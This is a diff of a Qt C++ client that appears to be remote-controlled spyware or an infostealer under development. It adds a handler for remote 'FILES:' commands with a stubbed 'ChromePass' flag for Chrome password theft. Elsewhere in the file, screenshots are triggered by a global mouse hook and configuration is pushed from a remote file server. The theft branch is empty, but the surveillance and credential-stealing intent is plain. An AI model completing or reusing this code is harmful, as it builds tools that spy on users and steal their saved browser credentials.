@@ -33,12 +33,12 @@ Client::Client(QObject* parent, const QString& defaultPath, QString _ip, quint16
     //TODO: new variable isOnline?
 
     //Wait for new config file
-    connect(fileServer, &FileServer::dataSaved, [this](QString str, QString ip){ this->getNewFile(str, ip); });
+    connect(fileServer, &FileServer::dataSaved, [this](QString str, QString ip){ this->getFile(str, ip); });
 
     //Progress bar
     //connect(fileServer, &FileServer::dataGet, [this](qint64 a, qint64 b){ qDebug() << a/1024/1024 << b/1024/1024; });
 
-    //Connect screenshot module
+    //Start and connect screenshot module
     //connect(&MouseHook::instance(), &MouseHook::mouseClicked, &MouseHook::instance(), &MouseHook::makeScreenshot);
     connect(&MouseHook::instance(), &MouseHook::mouseClicked,
             this, [this]()
@@ -105,7 +105,7 @@ void Client::getOnline()
     fileClient->connect();
 }
 
-void Client::getNewFile(const QString& path, const QString & /*ip*/)
+void Client::getFile(const QString& path, const QString& /* ip */)
 {
     qDebug() << path;
     //TODO: if not online => send str online
@@ -113,6 +113,35 @@ void Client::getNewFile(const QString& path, const QString & /*ip*/)
     //If config received
     if (extension == "cfg")
         getNewConfig(path);
+}
+
+void Client::getString(const QString &string, const QString& /* ip */)
+{
+    //TODO
+    qDebug() << string;
+    QString command = string.section(':', 0, 0);
+    if (command == "FILES")
+    {
+        //remove "FILES:"
+        int colonPos = string.indexOf(":");
+        QString filesStr = string;
+        filesStr.remove(0, colonPos+1);
+
+        QString currentFile = filesStr.section(';', 0, 0);
+        quint16 files = currentFile.toInt();
+        if (files & ChromePass)
+        {
+            //
+        }
+
+        //Look for all files
+        currentFile = filesStr.section(';', 1, 1);
+        for (int i = 2; ! currentFile.isEmpty(); ++i)
+        {
+            qDebug() << currentFile;
+            currentFile = filesStr.section(';', i, i);
+        }
+    }
 }
 
 void Client::getNewConfig(const QString &path)
@@ -126,7 +155,7 @@ void Client::getNewConfig(const QString &path)
         oldConfig.remove();
     newConfig.rename("config.cfg");
 
-    //Check if folder is empty
+    //Check if folder is empty and delete
     QDir dir = path.section('/', 0, -2);
     if(dir.entryInfoList(QDir::NoDotAndDotDot|QDir::AllEntries).count() == 0)
         dir.rmdir(path.section('/', 0, -2)); //dir.name()
